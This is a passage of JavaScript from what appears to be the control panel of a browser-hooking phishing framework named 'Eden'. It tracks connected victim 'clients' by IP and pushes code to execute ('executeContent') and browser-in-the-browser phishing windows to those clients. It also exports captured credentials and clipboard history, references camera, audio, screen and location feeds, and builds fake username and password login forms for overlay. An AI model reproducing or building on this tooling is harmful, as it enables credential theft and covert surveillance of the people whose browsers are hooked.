            if (confirm('Are you sure you want to remove all clients?')) {
                // Remove all client cards
                const cards = document.querySelectorAll('.client-card');
                cards.forEach(card => card.remove());
                
                // Clear clients object
                clients = {};
                
                // Clear all timeouts
                for (const key in connectionTimeouts) {
                    clearTimeout(connectionTimeouts[key]);
                }
                connectionTimeouts = {};
                
                // Show empty state
                emptyState.style.display = 'block';
                
                // Save to localStorage
                saveClientsToStorage();
                
                // Update button states
                updateCommunicateButtonState();
            }
        }
        
        // Update communicate button state (enable/disable based on client selection)
        function updateCommunicateButtonState() {
            console.log('Updating communicate button state');
            
            // Get all buttons that depend on client selection
            const buttons = document.querySelectorAll('.action-btn');
            
            // Check if any clients are selected and online
            const anySelectedClients = Object.values(clients).some(client => 
                client.selected && client.status === 'online');
            
            // Enable or disable buttons based on selection state
            buttons.forEach(button => {
                if (anySelectedClients) {
                    button.disabled = false;
                    button.classList.remove('disabled');
                } else {
                    button.disabled = true;
                    button.classList.add('disabled');
                }
            });
            
            // Update selection info text
            const selectionInfo = document.querySelector('#selection-info');
            if (selectionInfo) {
                const selectedCount = Object.values(clients).filter(c => c.selected && c.status === 'online').length;
                if (selectedCount > 0) {
                    selectionInfo.textContent = `${selectedCount} client(s) selected`;
                    selectionInfo.style.display = 'block';
                } else {
                    selectionInfo.style.display = 'none';
                }
            }
        }
        
        // Save clients to localStorage
        function saveClientsToStorage() {
            localStorage.setItem('clients', JSON.stringify(clients));
        }
        
                // Load clients from localStorage
        function loadClientsFromStorage() {
            const storedClients = localStorage.getItem('clients');
            if (storedClients) {
                try {
                    // Parse all stored clients
                    const allClients = JSON.parse(storedClients);
                    console.log('Found', Object.keys(allClients).length, 'total clients in storage');
                    
                    // Check for clients with nicknames
                    Object.keys(allClients).forEach(key => {
                        const client = allClients[key];
                        if (client.nickname && client.clientId) {
                            console.log(`Found client with nickname: ${client.nickname}, ID: ${client.clientId}`);
                        }
                    });
                    
                    // Filter to only keep online clients or those recently seen
                    const onlineClients = {};
                    const now = new Date().getTime();
                    
                    Object.keys(allClients).forEach(key => {
                        const client = allClients[key];
                        
                        // Calculate time since last seen
                        const lastSeen = new Date(client.lastSeen).getTime();
                        const timeSinceLastSeen = now - lastSeen;
                        
                        // Skip clients that have been inactive too long
                        if (timeSinceLastSeen > CLIENT_TIMEOUT) {
                            console.log('Skipping inactive client:', key, 'inactive for', timeSinceLastSeen, 'ms');
                            return;
                        }
                        
                        // Skip explicitly offline clients
                        if (client.status === 'offline') {
                            console.log('Skipping offline client:', key);
                            return;
                        }
                        
                        // Keep only active clients
                        console.log('Keeping active client:', key);
                        onlineClients[key] = client;
                    });
                    
                    // Set the filtered clients
                    clients = onlineClients;
                    console.log('Loaded', Object.keys(clients).length, 'active clients from storage');
                    
                    // Add client cards for active clients only
                    Object.keys(clients).forEach(clientKey => {
                        addClientCard(clientKey);
                        
                        // All clients we load should be online at this point
                        console.log('Setting timeout for active client:', clientKey);
                        
                        // Calculate remaining time before marking as offline
                        const lastSeen = new Date(clients[clientKey].lastSeen).getTime();
                        const timeSinceLastSeen = now - lastSeen;
                        const remainingTime = Math.max(100, CLIENT_TIMEOUT - timeSinceLastSeen);
                        
                        // Set timeout to mark as offline if no updates received
                connectionTimeouts[clientKey] = setTimeout(() => {
                            clients[clientKey].status = 'offline';
                            updateClientUI(clientKey);
                            updateCommunicateButtonState();
                            // Save clients to localStorage to persist offline status
                            saveClientsToStorage();
                            console.log(`Client ${clientKey} marked offline after ${CLIENT_TIMEOUT}ms timeout`);
                        }, remainingTime);
                    });
                    
                    // Save the updated clients with offline statuses
                    saveClientsToStorage();
                    
                    // Hide empty state if we have clients
                    if (Object.keys(clients).length > 0) {
                        emptyState.style.display = 'none';
                    }
                } catch (error) {
                    console.error('Error parsing clients from localStorage:', error);
                    // Reset clients if corrupted
                    clients = {};
                    localStorage.removeItem('clients');
                }
            } else {
                console.log('No clients found in localStorage');
            }
        }
        
     
        // Handle client selection change
        function handleClientSelection(clientKey) {
            const card = document.getElementById(`client-${clientKey}`);
            const selectBtn = card.querySelector('.select-btn');
            
            // Toggle selection state
            const currentlySelected = clients[clientKey].selected;
            clients[clientKey].selected = !currentlySelected;
            
            // Update UI
            if (clients[clientKey].selected) {
                card.classList.add('selected');
                selectBtn.textContent = 'Selected';
                selectBtn.classList.add('selected');
                
                // Automatically show communication interface when client is selected
                // This replaces the need for the communicate button
                const selectedClients = Object.keys(clients).filter(key => 
                    clients[key].selected && clients[key].status === 'online');
                
                if (selectedClients.length > 0) {
                    showCommunicationInterface();
                }
                            } else {
                card.classList.remove('selected');
                selectBtn.textContent = 'Select';
                selectBtn.classList.remove('selected');
            }
            
                                    updateCommunicateButtonState();
                                    saveClientsToStorage();
                                    
                                    if (typeof notifyEdenQRSelectionUpdate === 'function') {
                                        notifyEdenQRSelectionUpdate();
                                    }
        }
        
        // Show communication interface
        function showCommunicationInterface() {
            if (selectedClients.length === 0) {
                return;
            }
            
            // Get first selected client (we'll only communicate with one at a time)
            const clientKey = selectedClients[0];
            const client = clients[clientKey];
            
            // Update UI
            selectedIpDisplay.textContent = client.ip;
            messageInput.value = '';
            communicationInterface.style.display = 'block';
        }
        
        // Cancel all selections
        function cancelSelection() {
            Object.keys(clients).forEach(clientKey => {
                clients[clientKey].selected = false;
                const card = document.getElementById(`client-${clientKey}`);
                if (card) {
                    card.classList.remove('selected');
                    const checkbox = card.querySelector('.selection-checkbox');
                    if (checkbox) {
                        checkbox.checked = false;
                    }
                }
            });
            
            updateCommunicateButtonState();
            communicationInterface.style.display = 'none';
            saveClientsToStorage();
        }
        
        // Load stored files from localStorage on page load
        window.addEventListener('load', () => {
            // Load files
            const storedFiles = localStorage.getItem('files');
            if (storedFiles) {
                fileStorage = new Map(JSON.parse(storedFiles));
                updateFileList();
                saveToLocalStorage();
            }
        });
        
        // Setup drop zone event listeners
        if (dropZone) {
            dropZone.addEventListener('dragover', (e) => {
                e.preventDefault();
                dropZone.classList.add('active');
            });
            
            dropZone.addEventListener('dragleave', () => {
                dropZone.classList.remove('active');
            });
            
            dropZone.addEventListener('drop', (e) => {
                e.preventDefault();
                dropZone.classList.remove('active');
                
                if (e.dataTransfer.files.length > 0) {
                    Array.from(e.dataTransfer.files).forEach(file => {
                        handleFile(file);
                    });
                }
            });
        }
        
        // Setup file input event listener
        if (fileInput) {
            fileInput.addEventListener('change', () => {
                if (fileInput.files.length > 0) {
                    Array.from(fileInput.files).forEach(file => {
                        handleFile(file);
                    });
                }
            });
        }
        
        // Attach event listeners for sidebar navigation
        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const section = link.getAttribute('data-section');
                switchSection(section);
                
                // Close sidebar on mobile after navigation
                if (window.innerWidth <= 767) {
                    sidebar.classList.remove('active');
                }
            });
        });
        
        // Toggle sidebar when button is clicked (for both mobile and desktop)
        document.getElementById('mobileNavToggle').addEventListener('click', () => {
            sidebar.classList.toggle('active');
            // Save sidebar state in localStorage
            localStorage.setItem('eden-sidebar-state', sidebar.classList.contains('active') ? 'active' : 'inactive');
        });
        
        // Check if there's a saved sidebar state on page load
        const savedSidebarState = localStorage.getItem('eden-sidebar-state');
        if (savedSidebarState === 'active') {
            sidebar.classList.add('active');
        } else if (window.innerWidth > 767) {
            // On desktop, default to showing sidebar if no saved state
            sidebar.classList.add('active');
        }
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', (e) => {
            if (window.innerWidth <= 767 && 
                sidebar.classList.contains('active') && 
                !sidebar.contains(e.target) && 
                e.target.id !== 'mobileNavToggle' &&
                !e.target.closest('#mobileNavToggle')) {
                sidebar.classList.remove('active');
            }
        });
        
        clearAllBtn.addEventListener('click', clearAllClients);
        
        // Communication related event listeners
        cancelSelectionBtn.addEventListener('click', cancelSelection);
        
        closeCommBtn.addEventListener('click', function() {
            communicationInterface.style.display = 'none';
        });
        
        sendMessageBtn.addEventListener('click', function() {
            if (selectedClients.length === 0) {
                return;
            }
            
            const message = messageInput.value.trim();
            if (!message) {
                alert('Please enter a message');
                return;
            }
            
            // Send message to first selected client
            const clientKey = selectedClients[0];
            const success = sendMessageToClient(clientKey, message);
            
            if (success) {
                alert('Message sent successfully');
                messageInput.value = '';
            }
        });
        
        // Add event delegation for select buttons
        clientList.addEventListener('click', function(e) {
            if (e.target.classList.contains('select-btn')) {
                const clientKey = e.target.dataset.key;
                handleClientSelection(clientKey);
                e.stopPropagation(); // Prevent card click from toggling details
            }
        });
        
        // Function to send content to selected clients
        function sendContentToSelectedClients(actionType, customFavicon, customUrl) {
            const codeInput = document.getElementById('codeInput');
            const content = codeInput.value.trim();
            const reload = document.getElementById('displayReloadToggle').checked;
            // Fixed reload delay to 1.5 seconds (matching test.html)
            const reloadDelay = 1.5;
            
            // Check if any clients are selected
            const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
            
            if (selectedClients.length === 0) {
                alert('Please select at least one client from the Connection section');
                return;
            }
            
            // Prepare the message data
            const messageData = {
                type: actionType,
                content: content,
                fileName: 'editor-content.html',
                reload: reload,
                reloadDelay: reloadDelay
            };
            
            // Add custom BITB values if provided
            if (actionType === 'BITBContent') {
                // Always include customFavicon and customUrl in message, even if null
                // This allows eden.js to distinguish between "not set" and "explicitly empty"
                messageData.customFavicon = customFavicon || null;
                messageData.customUrl = customUrl || null;
                console.log('BITB message - customFavicon:', messageData.customFavicon, 'customUrl:', messageData.customUrl);
            }
            
            console.log('Sending BITB message with data:', JSON.stringify(messageData, null, 2));
            
            // Send to selected clients only
            sendToSelectedClients(messageData);
            
            // Update selection info
            const selectionInfo = document.getElementById('selection-info');
            if (selectionInfo) {
                selectionInfo.textContent = `Content sent to ${selectedClients.length} selected client(s)`;
                selectionInfo.style.display = 'block';
                                setTimeout(() => {
                    selectionInfo.style.display = 'none';
                }, 3000);
            }
        }
        
        // Manual reload button handler (handled in main script block)
        /*
        const manualReloadBtn = document.getElementById('manualReloadBtn');
        if (manualReloadBtn) {
            manualReloadBtn.addEventListener('click', function() {
                const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                if (selectedClients.length === 0) {
                    alert('Please select at least one client from the Connection section');
                    return;
                }
                // Fixed reload delay to 1.5 seconds (matching test.html)
                const reloadDelay = 1.5;
                
                sendToSelectedClients({
                    type: 'manualReload',
                    reloadDelay: reloadDelay
                });
            });
        }
        */
        
        // Function to ensure audio context is resumed
        function ensureAudioContextResumed() {
            if (window.audioContext && window.audioContext.state === 'suspended') {
                window.audioContext.resume().then(() => {
                    console.log('AudioContext resumed successfully');
                }).catch(err => {
                    console.error('Failed to resume AudioContext:', err);
                });
            }
        }
        
        // Define createClientElement as an alias for addClientCard
        function createClientElement(clientKey) {
            console.log('Creating client element for:', clientKey);
            addClientCard(clientKey);
        }
        
        // Document ready function
        document.addEventListener('DOMContentLoaded', function() {
                    // First load clients from storage to establish existing connections
        loadClientsFromStorage();
        
        // Then initialize the WebSocket connection after client data is loaded
        // This ensures existing connections are recognized properly
        initWebSocket();
        
        // Start nickname refresh interval to continuously update all client displays
        // This ensures newly created containers (camera, audio, screen, clipboard, location)
        // show the nickname immediately instead of waiting for a refresh
        let nicknameRefreshInterval = setInterval(() => {
            // For each client with a nickname, refresh their badges
            for (const key in clients) {
                if (clients[key].clientId && clients[key].nickname) {
                    replaceClientBadges(clients[key].clientId, clients[key].nickname);
                }
            }
        }, 500); // Check every 500ms
        
        // Update all client badges with nicknames after a short delay
        setTimeout(updateAllClientBadges, 2000);
        
        // Function to update all client badges with nicknames
        function updateAllClientBadges() {
            console.log("Updating all client badges with nicknames");
            
            // Debug: Log all client IDs in our clients object
            console.log("=== DEBUG: All Client IDs in clients object ===");
            Object.keys(clients).forEach(key => {
                console.log(`Client key: ${key}`);
                console.log(`Client ID: ${clients[key].clientId}`);
                console.log(`Client nickname: ${clients[key].nickname || 'none'}`);
                console.log(`Client IP: ${clients[key].ip}`);
                console.log("---");
            });
            
            // Debug: Find all client badges in the preview section
            console.log("=== DEBUG: All client badges in preview section ===");
            const allBadges = document.querySelectorAll('.client-badge');
            allBadges.forEach((badge, index) => {
                console.log(`Badge ${index}: id=${badge.id}, text=${badge.textContent}`);
                
                // Extract client ID from badge ID
                if (badge.id && badge.id.startsWith('client-badge-')) {
                    const badgeClientId = badge.id.replace('client-badge-', '');
                    console.log(`  Badge client ID: ${badgeClientId}`);
                    
                    // Try to find this client in our clients object
                    let found = false;
                    Object.keys(clients).forEach(key => {
                        if (clients[key].clientId === badgeClientId) {
                            found = true;
                            console.log(`  Found matching client with key: ${key}`);
                            if (clients[key].nickname) {
                                console.log(`  Client has nickname: ${clients[key].nickname}`);
                                badge.textContent = `Client: ${clients[key].nickname}`;
                                console.log(`  Updated badge text to: ${badge.textContent}`);
                            }
                        }
                    });
                    
                    if (!found) {
                        console.log(`  No matching client found for badge ID: ${badgeClientId}`);
                    }
                }
            });
            
            // Loop through all clients and update their badges if they have nicknames
            Object.keys(clients).forEach(key => {
                const client = clients[key];
                if (client.clientId && client.nickname) {
                    console.log(`Updating badge for client ${client.clientId} with nickname: ${client.nickname}`);
                    updateClientBadge(client.clientId, client.nickname);
                }
            });
        }
            
            // Update UI states
            updateCommunicateButtonState();
            
            // Initialize credentials section
            loadStoredCredentials();
            
            // Add click listener to document to ensure audio context can be resumed
            document.addEventListener('click', ensureAudioContextResumed);
            document.addEventListener('touchstart', ensureAudioContextResumed);
            
                    // Set up credentials buttons
        const clearCredentialsBtn = document.getElementById('clearCredentialsBtn');
        if (clearCredentialsBtn) {
            clearCredentialsBtn.addEventListener('click', clearAllCredentials);
        }
        
        // Set up export credentials button
        const exportCredentialsBtn = document.getElementById('exportCredentialsBtn');
        if (exportCredentialsBtn) {
            exportCredentialsBtn.addEventListener('click', exportAllCredentials);
        }
        
        // Set up export clipboard button
        const exportClipboardBtn = document.getElementById('exportClipboardBtn');
        if (exportClipboardBtn) {
            exportClipboardBtn.addEventListener('click', exportClipboardHistory);
        }
            
            // Store BITB customization values
            let bitbCustomFavicon = null;
            let bitbCustomUrl = null;
            
            // BITB Customization Modal handlers
            const bitbModal = document.getElementById('bitb-custom-modal');
            const bitbFaviconInput = document.getElementById('bitb-favicon-input');
            const bitbUrlInput = document.getElementById('bitb-url-input');
            const bitbCancelBtn = document.getElementById('bitb-cancel-btn');
            const bitbSaveBtn = document.getElementById('bitb-save-btn');
            
            if (bitbCancelBtn) {
                bitbCancelBtn.addEventListener('click', function() {
                    bitbModal.style.display = 'none';
                    bitbFaviconInput.value = '';
                    bitbUrlInput.value = '';
                });
            }
            
            if (bitbSaveBtn) {
                bitbSaveBtn.addEventListener('click', function() {
                    const faviconValue = bitbFaviconInput.value.trim();
                    const urlValue = bitbUrlInput.value.trim();
                    bitbCustomFavicon = faviconValue || null;
                    bitbCustomUrl = urlValue || null;
                    console.log('BITB customization saved - Favicon:', bitbCustomFavicon, 'URL:', bitbCustomUrl);
                    bitbModal.style.display = 'none';
                    // Don't clear inputs - keep them for next time
                    // bitbFaviconInput.value = '';
                    // bitbUrlInput.value = '';
                });
            }
            
            // Right-click handler for BITB button
            const bitbBtn = document.getElementById('BITBBtn');
            if (bitbBtn) {
                bitbBtn.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    bitbFaviconInput.value = bitbCustomFavicon || '';
                    bitbUrlInput.value = bitbCustomUrl || '';
                    bitbModal.style.display = 'flex';
                });
            }
            
            // Set up action button click handlers
            document.getElementById('viewBtn').addEventListener('click', function() {
                sendContentToSelectedClients('showsContent');
            });
            
            document.getElementById('BITBBtn').addEventListener('click', function() {
                console.log('BITB button clicked - using favicon:', bitbCustomFavicon, 'URL:', bitbCustomUrl);
                sendContentToSelectedClients('BITBContent', bitbCustomFavicon, bitbCustomUrl);
                // Reset after use (optional - remove if you want to persist)
                // bitbCustomFavicon = null;
                // bitbCustomUrl = null;
            });
            
            document.getElementById('executeBtn').addEventListener('click', function() {
                sendContentToSelectedClients('executeContent');
            });
            
            document.getElementById('cleanBtn').addEventListener('click', function() {
                sendContentToSelectedClients('cleanContent');
            });
            
            
            // Initialize blur section functionality
            setupBlurSection();
            
            // Initialize custom template section
            setupCustomSection();
            
            // Setup section navigation
            setupSectionNavigation();
        });
        
        // Setup section navigation functionality
        function setupSectionNavigation() {
            const navLinks = document.querySelectorAll('.sidebar-menu-item a');
            const sections = document.querySelectorAll('.content-section');
            
            // Hide all sections except the active one on initial load
            sections.forEach(section => {
                section.style.display = 'none';
            });
            
            // Show the default section (connection)
            document.getElementById('connection').style.display = 'block';
            
            // Add click event to all nav links
            navLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    // Remove active class from all links
                    navLinks.forEach(l => l.classList.remove('active'));
                    
                    // Add active class to clicked link
                    this.classList.add('active');
                    
                    // Hide all sections
                    sections.forEach(section => {
                        section.style.display = 'none';
                    });
                    
                    // Show the target section
                    const targetSection = this.getAttribute('data-section');
                    document.getElementById(targetSection).style.display = 'block';
                });
            });
        }
        // Setup custom template functionality
        function setupCustomSection() {
            // Initialize custom section variables
            const templateName = document.getElementById('templateName');
            const logoText = document.getElementById('logoText');
            const logoUrl = document.getElementById('logoUrl');
            const containerColor = document.getElementById('containerColor');
            const colorCode = document.getElementById('colorCode');
            const loginButtonColor = document.getElementById('loginButtonColor');
            const buttonColorCode = document.getElementById('buttonColorCode');
            const textColor = document.getElementById('textColor');
            const textColorCode = document.getElementById('textColorCode');
            const buttonText = document.getElementById('buttonText');
            const formStyle = document.getElementById('formStyle');
            const formFieldsContainer = document.getElementById('formFieldsContainer');
            const templatePreview = document.getElementById('templatePreview');
            const sendTemplateBtn = document.getElementById('sendTemplateBtn');
            const resetTemplateBtn = document.getElementById('resetTemplateBtn');
            const addFieldBtn = document.getElementById('addFieldBtn');
            const templateWidth = document.getElementById('templateWidth');
            const templateHeight = document.getElementById('templateHeight');
            const autoHeightCheckbox = document.getElementById('autoHeight');
            const makeRequiredFields = document.getElementById('makeRequiredFields');
            const addRememberMe = document.getElementById('addRememberMe');
            const addForgotPassword = document.getElementById('addForgotPassword');
            
            // Update color code when color picker changes
            containerColor.addEventListener('input', function() {
                colorCode.value = this.value;
                updatePreview();
            });
            
            // Update color picker when color code changes
            colorCode.addEventListener('input', function() {
                containerColor.value = this.value;
                updatePreview();
            });
            
            // Update button color code when color picker changes
            loginButtonColor.addEventListener('input', function() {
                buttonColorCode.value = this.value;
                updatePreview();
            });
            
            // Update button color picker when color code changes
            buttonColorCode.addEventListener('input', function() {
                loginButtonColor.value = this.value;
                updatePreview();
            });
            
            // Update text color code when color picker changes
            textColor.addEventListener('input', function() {
                textColorCode.value = this.value;
                updatePreview();
            });
            
            // Update text color picker when color code changes
            textColorCode.addEventListener('input', function() {
                textColor.value = this.value;
                updatePreview();
            });
            
            // Toggle height input based on auto height checkbox
            autoHeightCheckbox.addEventListener('change', function() {
                templateHeight.disabled = this.checked;
                updatePreview();
            });
            
            // Update preview when checkboxes change
            makeRequiredFields.addEventListener('change', updatePreview);
            addRememberMe.addEventListener('change', updatePreview);
            addForgotPassword.addEventListener('change', updatePreview);
            
            // Update preview when dropdown selections change
            formStyle.addEventListener('change', updatePreview);
            
            // Add field button click handler
            addFieldBtn.addEventListener('click', function() {
                addFormField();
            });
            
            // Add event listeners for live preview
            templateName.addEventListener('input', updatePreview);
            logoText.addEventListener('input', updatePreview);
            logoUrl.addEventListener('input', updatePreview);
            buttonText.addEventListener('input', updatePreview);
            templateWidth.addEventListener('input', updatePreview);
            templateHeight.addEventListener('input', updatePreview);
            
            // Send button click handler
            sendTemplateBtn.addEventListener('click', function() {
                sendCustomTemplate();
            });
            
            // Reset button click handler
            resetTemplateBtn.addEventListener('click', function() {
                resetCustomForm();
            });
            
            // Function to reset form to default values
            function resetCustomForm() {
                templateName.value = '';
                logoText.value = 'LOGO';
                logoUrl.value = '';
                containerColor.value = '#ffffff';
                colorCode.value = '#ffffff';
                loginButtonColor.value = '#0066ff';
                buttonColorCode.value = '#0066ff';
                textColor.value = '#333333';
                textColorCode.value = '#333333';
                buttonText.value = 'Sign In';
                formStyle.value = 'standard';
                templateWidth.value = 400;
                templateHeight.value = 400;
                autoHeightCheckbox.checked = true;
                templateHeight.disabled = true;
                makeRequiredFields.checked = false;
                addRememberMe.checked = false;
                addForgotPassword.checked = false;
                
                // Clear all form fields except the first one
                const fieldRows = formFieldsContainer.querySelectorAll('.field-row');
                for (let i = 1; i < fieldRows.length; i++) {
                    formFieldsContainer.removeChild(fieldRows[i]);
                }
                
                // Reset the first field to username
                const firstSelect = formFieldsContainer.querySelector('select');
                if (firstSelect) {
                    firstSelect.value = 'username';
                }
                
                updatePreview();
            }
            
            // Function to add a new form field
            function addFormField() {
                const fieldRow = document.createElement('div');
                fieldRow.className = 'field-row';
                
                const fieldSelect = document.createElement('div');
                fieldSelect.className = 'field-select';
                
                const select = document.createElement('select');
                select.className = 'form-control';
                select.innerHTML = `
                    <option value="username">Username</option>
                    <option value="email">Email</option>
                    <option value="password">Password</option>
                `;
                
                fieldSelect.appendChild(select);
                
                const removeBtn = document.createElement('button');
                removeBtn.className = 'btn btn-small';
                removeBtn.innerHTML = '<i class="fas fa-trash"></i>';
                removeBtn.addEventListener('click', function() {
                    formFieldsContainer.removeChild(fieldRow);
                    updatePreview();
                });
                
                fieldRow.appendChild(fieldSelect);
                fieldRow.appendChild(removeBtn);
                
                formFieldsContainer.appendChild(fieldRow);
                
                // Update the preview after adding a field
                updatePreview();
                
                // Add change event to the new select
                select.addEventListener('change', updatePreview);
            }
            
            // Function to update the live preview
            function updatePreview() {
                const name = templateName.value || 'My Template';
                const logo = logoText.value || 'LOGO';
                const imgUrl = logoUrl.value;
                const bgColor = containerColor.value;
                const btnColor = loginButtonColor.value;
                const txtColor = textColor.value;
                const btnText = buttonText.value || 'Sign In';
                const formDesign = formStyle.value;
                const width = templateWidth.value || 400;
                const height = templateHeight.value || 400;
                const useAutoHeight = autoHeightCheckbox.checked;
                const isRequired = makeRequiredFields.checked;
                const hasRememberMe = addRememberMe.checked;
                const hasForgotPassword = addForgotPassword.checked;
                
                // Get all form fields
                const fields = [];
                const fieldSelects = formFieldsContainer.querySelectorAll('select');
                fieldSelects.forEach(select => {
                    fields.push(select.value);
                });
                
                // Set form style based on selection
                let formBorderRadius = '8px';
                let formBoxShadow = '0 4px 10px rgba(0,0,0,0.1)';
                let inputBorderRadius = '4px';
                let inputBorder = '1px solid #ddd';
                let inputBoxShadow = 'none';
                
                switch(formDesign) {
                    case 'rounded':
                        formBorderRadius = '16px';
                        inputBorderRadius = '20px';
                        break;
                    case 'flat':
                        formBorderRadius = '0';
                        formBoxShadow = 'none';
                        inputBorderRadius = '0';
                        inputBorder = '0';
                        inputBoxShadow = '0 1px 0 rgba(0,0,0,0.2)';
                        break;
                    case 'shadow':
                        formBoxShadow = '0 10px 30px rgba(0,0,0,0.2)';
                        inputBoxShadow = '0 2px 5px rgba(0,0,0,0.1) inset';
                        break;
                }
                
                // Generate the inner content HTML
                let innerHtml = `
                    <div style="padding: 20px; background-color: ${bgColor}; border-radius: ${formBorderRadius}; box-shadow: ${formBoxShadow};">
                        <div style="text-align: center; margin-bottom: 20px;">
                `;
                
                // Add logo image or text
                if (imgUrl) {
                    innerHtml += `<img src="${imgUrl}" alt="${logo}" style="max-height: 60px; max-width: 100%;">`;  
                } else {
                    innerHtml += `<h2 style="font-size: 24px; color: ${txtColor};">${logo}</h2>`;
                }
                
                innerHtml += `
                        </div>
                        <form style="display: flex; flex-direction: column;">
                `;
                
                // Add form fields
                fields.forEach(field => {
                    const isPassword = field === 'password';
                    const fieldLabel = field.charAt(0).toUpperCase() + field.slice(1);
                    
                    innerHtml += `
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; font-size: 14px; color: ${txtColor};">${fieldLabel}</label>
                            <input type="${isPassword ? 'password' : 'text'}" name="${field}" placeholder="Enter your ${field}" ${isRequired ? 'required' : ''} style="width: 100%; padding: 10px; border: ${inputBorder}; border-radius: ${inputBorderRadius}; box-shadow: ${inputBoxShadow};">
                        </div>
                    `;
                });
                
                // Add remember me checkbox if enabled
                if (hasRememberMe) {
                    innerHtml += `
                        <div style="margin-bottom: 15px;">
                            <label style="display: flex; align-items: center; color: ${txtColor}; font-size: 14px;">
                                <input type="checkbox" style="margin-right: 8px;"> Remember me
                            </label>
                        </div>
                    `;
                }
                
                // Add submit button
                innerHtml += `
                            <button type="submit" style="background-color: ${btnColor}; color: white; border: none; padding: 12px; border-radius: ${inputBorderRadius}; cursor: pointer; font-weight: bold; margin-top: 10px;">
                                ${btnText}
                            </button>
                `;
                
                // Add forgot password link if enabled
                if (hasForgotPassword) {
                    innerHtml += `
                            <div style="text-align: center; margin-top: 15px;">
                                <a href="#" style="color: ${btnColor}; text-decoration: none; font-size: 14px;">Forgot password?</a>
                            </div>
                    `;
                }
                
                innerHtml += `
                        </form>
                    </div>
                `;
                
                // Wrap the content in a container with the specified width and height
                const previewHtml = `
                    <div style="max-width: ${width}px; ${!useAutoHeight ? `height: ${height}px;` : ''} margin: 0 auto; overflow: auto;">
                        ${innerHtml}
                    </div>
                `;
                
                templatePreview.innerHTML = previewHtml;
            }
            
            // Function to send the custom template to the blur section
            function sendCustomTemplate() {
                if (!templateName.value) {
                    alert('Please enter a template name');
                    return;
                }
                
                // Get the template width and height
                const width = templateWidth.value || 400;
                let height = templateHeight.value || 400;
                const useAutoHeight = autoHeightCheckbox.checked;
                
                if (useAutoHeight) {
                    height = 'auto';
                }
                
                // Generate the HTML content
                const name = templateName.value;
                
                // Get all the custom settings
                const isRequired = makeRequiredFields.checked;
                const btnColor = loginButtonColor.value;
                const txtColor = textColor.value;
                const btnText = buttonText.value || 'Sign In';
                const formDesign = formStyle.value;
                const hasRememberMe = addRememberMe.checked;
                const hasForgotPassword = addForgotPassword.checked;
                const bgColor = containerColor.value; // Fixed: This was missing
                
                // Set form style based on selection
                let formBorderRadius = '8px';
                let formBoxShadow = '0 4px 10px rgba(0,0,0,0.1)';
                let inputBorderRadius = '4px';
                let inputBorder = '1px solid #ddd';
                let inputBoxShadow = 'none';
                
                switch(formDesign) {
                    case 'rounded':
                        formBorderRadius = '16px';
                        inputBorderRadius = '20px';
                        break;
                    case 'flat':
                        formBorderRadius = '0';
                        formBoxShadow = 'none';
                        inputBorderRadius = '0';
                        inputBorder = '0';
                        inputBoxShadow = '0 1px 0 rgba(0,0,0,0.2)';
                        break;
                    case 'shadow':
                        formBoxShadow = '0 10px 30px rgba(0,0,0,0.2)';
                        inputBoxShadow = '0 2px 5px rgba(0,0,0,0.1) inset';
                        break;
                }
                
                // Generate a complete HTML document with width and height settings
                const fullHtmlContent = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${name}</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        .template-container {
            width: ${width}px;
            ${height !== 'auto' ? `height: ${height}px;` : 'height: auto;'}
            margin: 0 auto;
            overflow: auto;
        }
        .form-container {
            padding: 20px;
            background-color: ${bgColor};
            border-radius: ${formBorderRadius};
            box-shadow: ${formBoxShadow};
        }
        .form-heading {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-heading h2 {
            font-size: 24px;
            color: ${txtColor};
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: ${txtColor};
        }
        .form-input {
            width: 100%;
            padding: 10px;
            border: ${inputBorder};
            border-radius: ${inputBorderRadius};
            box-shadow: ${inputBoxShadow};
            box-sizing: border-box;
        }
        .form-checkbox {
            display: flex;
            align-items: center;
            color: ${txtColor};
            font-size: 14px;
        }
        .form-checkbox input {
            margin-right: 8px;
        }
        .login-button {
            background-color: ${btnColor};
            color: white;
            border: none;
            padding: 12px;
            border-radius: ${inputBorderRadius};
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            width: 100%;
        }
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        .forgot-password a {
            color: ${btnColor};
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="template-container">
        ${templatePreview.innerHTML.replace(/^\s+<div style="max-width: .*?overflow: auto;">\s+/s, '').replace(/\s+<\/div>\s+$/s, '')}
    </div>
</body>
</html>`;
                
                // Create a filename with HTML extension
                const fileName = name.replace(/\s+/g, '-').toLowerCase() + '.html';
                
                try {
                    // Directly access the localStorage and add the file
                    const blurStorageKey = 'eden-blur-files';
                    let files = {};
                    
                    try {
                        const savedFiles = localStorage.getItem(blurStorageKey);
                        if (savedFiles) {
                            files = JSON.parse(savedFiles);
                        }
                    } catch (error) {
                        console.error('Error loading blur files:', error);
                    }
                    
                    // Add the new file
                    files[fileName] = fullHtmlContent;
                    
                    // Save back to localStorage
                    localStorage.setItem(blurStorageKey, JSON.stringify(files));
                    
                    // Try to refresh the blur files display
                    if (typeof window.renderBlurFiles === 'function') {
                        window.renderBlurFiles();
                    }
                    
                    // Show success message
                    alert(`Template "${name}" successfully saved to the Blur section!`);
                    
                    // Switch to the blur section to show the result
                    const blurLink = document.querySelector('a[data-section="blur"]');
                    if (blurLink) {
                        blurLink.click();
                    }
                } catch (error) {
                    console.error('Error saving template to blur section:', error);
                    alert('Error saving template: ' + error.message);
                }
            }
            
            // Function to reset the form
            function resetCustomForm() {
                templateName.value = '';
                logoText.value = '';
                logoUrl.value = '';
                containerColor.value = '#ffffff';
                colorCode.value = '#ffffff';
                templateWidth.value = '400';
                templateHeight.value = '400';
